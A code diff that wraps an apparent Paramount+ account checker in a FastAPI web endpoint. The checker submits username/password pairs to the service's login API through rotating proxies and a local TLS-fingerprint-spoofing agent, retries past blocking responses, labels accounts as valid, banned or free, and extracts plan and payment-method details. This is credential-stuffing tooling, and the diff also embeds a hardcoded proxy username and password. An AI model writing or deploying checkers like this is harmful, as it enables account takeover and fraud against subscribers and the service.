@@ -3,6 +3,11 @@ import re
 import secrets
 from typing import Dict, Any, Optional
 from aiohttp import ClientSession
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+
+# 1. Initialize the FastAPI app (Vercel looks for this variable name)
+app = FastAPI()
 
 COUNTRY_MAP = {
     "AF": "Afganistan 🇦🇫", "AX": "Åland Islands 🇫🇮", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿", 
@@ -73,6 +78,12 @@ COUNTRY_MAP = {
     "ZM": "Zambia 🇿🇲", "ZW": "Zimbabwe 🇿🇼"
 }
 
+# 2. Define Pydantic Input Schema
+class CheckInput(BaseModel):
+    username: str
+    password: str
+    proxy: Optional[str] = "core.eclipseproxy.com:3030:eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25"
+
 def parse_lr(source: str, left: str, right: str) -> str:
     try:
         start = source.index(left) + len(left)
@@ -82,32 +93,23 @@ def parse_lr(source: str, left: str, right: str) -> str:
         return ""
 
 def format_proxy(raw_proxy: str) -> Optional[str]:
-    """
-    Parses OpenBullet style proxy strings.
-    Matches your script's specific regex conversions:
-    userpass: "^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$"
-    ipport: "^([^:]+:[^:]+)"
-    """
     if not raw_proxy:
         return None
     try:
         userpass_match = re.search(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
         ipport_match = re.search(r"^([^:]+:[^:]+)", raw_proxy)
-        
         if userpass_match and ipport_match:
-            userpass = userpass_match.group(1)
-            ipport = ipport_match.group(1)
-            return f"http://{userpass}@{ipport}"
+            return f"http://{userpass_match.group(1)}@{ipport_match.group(1)}"
     except Exception:
         pass
     return None
 
-async def check_account(username: str, password: str, raw_proxy: Optional[str] = None) -> Dict[str, Any]:
+# 3. Create FastAPI Route
+@app.post("/check")
+async def run_check(payload: CheckInput):
     device_id = secrets.token_hex(8).lower()
     user_agent = "Mozilla/5.0 (Android; Mobile; rv:109.0) Gecko/110.0 Firefox/110.0" 
-    
-    # Processes the raw eclipse proxy string into curl URI format
-    proxy_url = format_proxy(raw_proxy) if raw_proxy else None
+    proxy_url = format_proxy(payload.proxy)
 
     headers = {
         "x-tp-h1order": "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,accept-encoding,accept-language",
@@ -126,39 +128,33 @@ async def check_account(username: str, password: str, raw_proxy: Optional[str] =
         "Content-Type": "application/x-www-form-urlencoded"
     }
     
-    # Injected proxy string sent as metadata command header to your TLS binary setup
     if proxy_url:
         headers["x-tp-proxy"] = proxy_url
 
     async with ClientSession() as session:
-        # --- REQUEST 1: Authentication ---
+        # Request 1
         login_url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
         headers["x-tp-url"] = login_url
         headers["x-tp-method"] = "POST"
         
-        payload = {
-            "j_username": username,
-            "j_password": password,
-            "deviceId": device_id
-        }
+        login_data = {"j_username": payload.username, "j_password": payload.password, "deviceId": device_id}
 
         while True:
             try:
-                async with session.post("http://127.0.0.1:9000", headers=headers, data=payload, timeout=120) as resp:
+                async with session.post("http://127.0.0.1:9000", headers=headers, data=login_data, timeout=120) as resp:
                     if resp.status in [500, 403, 406]:
                         continue
                     body = await resp.text()
                     break
             except Exception:
-                return {"status": "ERROR", "message": "Local proxy agent unaccessible"}
+                raise HTTPException(status_code=502, detail="Local TLS proxy agent unaccessible")
 
         if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
             return {"status": "FAIL"}
-        
         if "userId" not in body:
             return {"status": "BAN/UNKNOWN"}
 
-        # --- REQUEST 2: Status Check ---
+        # Request 2
         status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
         headers["x-tp-url"] = status_url
         headers["x-tp-method"] = "GET"
@@ -173,7 +169,7 @@ async def check_account(username: str, password: str, raw_proxy: Optional[str] =
                     body2 = await resp.text()
                     break
             except Exception:
-                return {"status": "ERROR", "message": "Failed connection on step 2"}
+                raise HTTPException(status_code=502, detail="Failed connection on step 2")
 
         if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
             return {"status": "FREE/CUSTOM"}
@@ -191,11 +187,3 @@ async def check_account(username: str, password: str, raw_proxy: Optional[str] =
                 "PaymentMethod": parse_lr(body2, '"packageSource":"', '"')
             }
         }
-
-# Smoke test call passing your proxy info directly
-if __name__ == "__main__":
-    target_proxy = "core.eclipseproxy.com:3030:eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25"
-    
-    # Internal validation output:
-    # Generates: http://eclipse_Acho1234:3b8fe71d-eb2a-40b6-9cad-bbb1927b0e25@core.eclipseproxy.com:3030
-    print(f"Formatted Proxy Header Output: {format_proxy(target_proxy)}")
